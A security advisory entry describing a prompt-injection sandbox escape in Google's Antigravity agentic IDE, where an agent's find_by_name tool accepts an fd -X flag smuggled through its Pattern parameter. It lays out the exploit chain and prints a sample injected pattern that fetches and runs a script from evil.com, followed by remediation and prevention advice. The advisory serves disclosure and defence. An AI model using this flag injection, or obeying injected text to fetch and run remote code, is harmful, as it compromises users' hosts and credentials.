---
id: 2026-02-google-antigravity-sandbox-escape
title: "Google Antigravity sandbox escape via fd flag injection (Pillar Security, Feb 2026)"
date_disclosed: 2026-01-07
last_updated: 2026-05-18
severity: high
status: patched
ecosystems: [antigravity, ai-agents]
tools_affected: [google-antigravity]
tags: [cve, prompt-injection, sandbox-escape, rce, agentic-ide, secure-mode, fd, google]
---

## TL;DR
Pillar Security disclosed a **Secure Mode bypass** in **Google Antigravity** — Google's agentic IDE — that turns a prompt injection into full RCE. The bug: the `find_by_name` tool fired before any sandbox/network/workspace-trust checks evaluated. By injecting the `fd` utility's **`-X` (exec-batch)** flag through the `Pattern` parameter, the agent's own file-search call executes arbitrary binaries against workspace files. Disclosed to Google **2026-01-07**, patched **2026-02-28**. The interesting part isn't the patch — it's the design lesson: **"Secure Mode" enforced its restrictions after the tool call, which is too late.**

## What happened
Antigravity ships a "Secure Mode" intended to be its most restrictive setting:
- No network access
- Writes confined to the workspace
- All shell ops sandboxed

The `find_by_name` kernel function accepts a `Pattern` parameter passed to the underlying `fd` utility. There was no sanitization for flag-injection: a pattern like `-X bash -c 'curl evil.com/x.sh | sh' .` causes `fd` to execute the arbitrary command for each matched file.

Critically, `find_by_name` runs **before** any of Secure Mode's checks evaluate. None of the network / write / sandbox restrictions kick in because, from Secure Mode's perspective, the user is just searching files. Combined with Antigravity's permitted file-create operation, the full exploit chain is:

1. Get a prompt injection landed in any content the agent reads (PR description, fetched URL, MCP payload, README).
2. Inject a `find_by_name` call with `Pattern` that smuggles `-X bash -c ...`.
3. Optionally drop a staged payload first via the create-file primitive and trigger it via the search.

No further user interaction once the injection lands.

## Am I affected?

```bash
# Are you running Antigravity?
which antigravity 2>/dev/null
antigravity --version 2>/dev/null

# The Pillar PoC ran against Antigravity Secure Mode prior to 2026-02-28 patch.
# Any pre-patch version is vulnerable.
```

If you ran Antigravity on any workspace where an agent could fetch untrusted content (browsed PR descriptions, fetched URLs, opened MCP servers) before the February patch, treat the host as potentially compromised — credentials, SSH keys, cloud creds — exactly the credential-stealing model from PyTorch Lightning / Mini Shai-Hulud may apply if the injection chained to one of those payloads.

### IOCs

| Type | Value |
|---|---|
| Vendor | Google |
| Product | Antigravity (agentic IDE) |
| Disclosed | 2026-01-07 |
| Patched | 2026-02-28 |
| Vulnerable surface | `find_by_name` tool (`fd -X` flag injection) |
| Class | Pre-sandbox tool exposure (prompt injection → arg injection → RCE) |

## If you are affected
1. Upgrade Antigravity past the February patch.
2. Review agent history / tool-call logs from the vulnerable window for unexpected `find_by_name` invocations with suspicious `Pattern` content.
3. Rotate credentials the agent had access to if any suspicious tool calls are found.
4. Treat the host like any post-RCE host: re-check for persistence (cron, login items, shell rc-files, dotfile additions).

## Why this matters
This is the second 2026 example of "**agent tool-call surface is bigger than the framework's security model**" — the first being Microsoft's Semantic Kernel `[KernelFunction]` exposure ([CVE-2026-25592](2026-05-semantic-kernel-rce.md)). The Antigravity case is even more pointed because there *was* a sandbox, with a named "Secure Mode" setting, and it failed open because of the order of operations.

For vibe coders this generalizes to: **don't trust a security mode flag on an AI IDE without testing**. Run any agent that can shell out inside a real OS-level sandbox.

## Prevention
→ [prevention/agent-sandboxing.md](../prevention/agent-sandboxing.md) — devcontainer / VM around the whole agent process
→ [prevention/mcp-hygiene.md](../prevention/mcp-hygiene.md)
→ When an agent IDE offers tools that wrap CLI utilities (`fd`, `grep`, `rg`, `git`), assume flag injection is possible. Don't pass agent-supplied strings as flags.
→ Vendor-mode "secure" flags are advisory. Always layer OS-level isolation.

## Sources
- [Pillar Security — Prompt Injection leads to RCE and Sandbox Escape in Antigravity](https://www.pillar.security/blog/prompt-injection-leads-to-rce-and-sandbox-escape-in-antigravity)
- [Dark Reading — Google Fixes Critical RCE Flaw in AI-Based 'Antigravity' Tool](https://www.darkreading.com/vulnerabilities-threats/google-fixes-critical-rce-flaw-ai-based-antigravity-tool)
- [CyberScoop — Vuln in Google's Antigravity AI agent manager could escape sandbox, give attackers remote code execution](https://cyberscoop.com/google-antigravity-pillar-security-agent-sandbox-escape-remote-code-execution/)
- [The Hacker News — Google Patches Antigravity IDE Flaw Enabling Prompt Injection Code Execution](https://thehackernews.com/2026/04/google-patches-antigravity-ide-flaw.html)
- [OECD.AI — Critical Remote Code Execution Vulnerability in Google's Antigravity AI IDE Patched](https://oecd.ai/en/incidents/2026-04-20-8687)
- [Cloud Security Alliance Labs — Antigravity Sandbox Escape: Prompt Injection and Native Tool Abuse](https://labs.cloudsecurityalliance.org/research/csa-research-note-agentic-ide-prompt-injection-sandbox-escap/)
- [danusminimus — Prompt Injection leads to RCE and Sandbox Escape in Antigravity](https://danusminimus.github.io/posts/Prompt-Injection-Leads-To-RCE-And-Sandbox-Escape-In-Antigravity/)
